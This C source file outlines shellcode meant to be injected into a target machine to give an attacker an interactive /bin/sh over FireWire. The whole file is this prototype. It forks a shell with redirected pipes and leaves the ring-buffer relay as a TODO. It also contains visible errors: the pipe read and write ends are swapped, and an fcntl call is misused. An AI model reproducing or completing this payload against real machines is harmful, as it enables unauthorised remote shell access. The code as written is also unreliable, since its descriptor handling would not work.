
// simple outline of a to-be-injected shellcode that gives
// an interactive shell over firewire
//
// obviously this needs to be recoded as PIC in ASM, the smaller, the better.
// 	ESI -> ringbuffer_from_master
// 	EDI -> ringbuffer_to_master
// 	EBP -> c2sh[0], sh2c[1]

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#define RBSIZE 512

struct ringbuffer {
	int		writer_pos;		// init to 0
	volatile int	reader_pos;		// init to 0
	char		buffer[RBSIZE];
};

int main()
{
	int c2sh[2];	// parent->shell	 0: parent writes;			1: shell reads (stdin);
	int sh2c[2];	// shell->parent	 0: shell writes (stdout,stderr);	1: parent reads;

	struct ringbuffer from_master;
	struct ringbuffer to_master;

	if(0 > pipe(c2sh))
		printf("pipe c2sh failed\n"), exit(-1);
	if(0 > pipe(sh2c))
		printf("pipe sh2c failed\n"), exit(-1);

	switch(fork()) {
		case 0:
			// child: change stdin, stdout and stderr and exec /bin/sh
			if(0 != dup2(c2sh[1], 0))
				printf("failed to dup stdin\n"), exit(-1);
			if(1 != dup2(sh2c[0], 1))
				printf("failed to dup stdout\n"), exit(-1);
			if(2 != dup2(sh2c[0], 2))
				printf("failed to dup stderr\n"), exit(-1);

			execl("/bin/sh", "/bin/sh", NULL);
			printf("exec failed!\n");
			exit(-1);
			break;
		default:
			// parent: use a ringbuffer for stdin and stdout of child
			close(c2sh[1]);
			close(sh2c[0]);

			// parent has to read from sh2c[1]
			//            and write to c2sh[0]
			//            -> O_ASYNC
			//            		only kernel2.6 for pipes...
			//            		optional, in combination with nanosleep?
			//            -> O_NONBLOCK
			fcntl(sh2c[1], F_GETFL, O_NONBLOCK);
			
			// TODO:
			// loop with read/write relayed via ringbuffer and nanosleep
			// 	(sighanl-handler -> ret and O_ASYNC for nanosleep?)
			// when both FD are closed: send a mark to master, wait for
			// ACK and then exit().

			break;
		case -1:
			printf("failed to fork\n");
			exit(-1);
			break;
	}

	return 0;
}

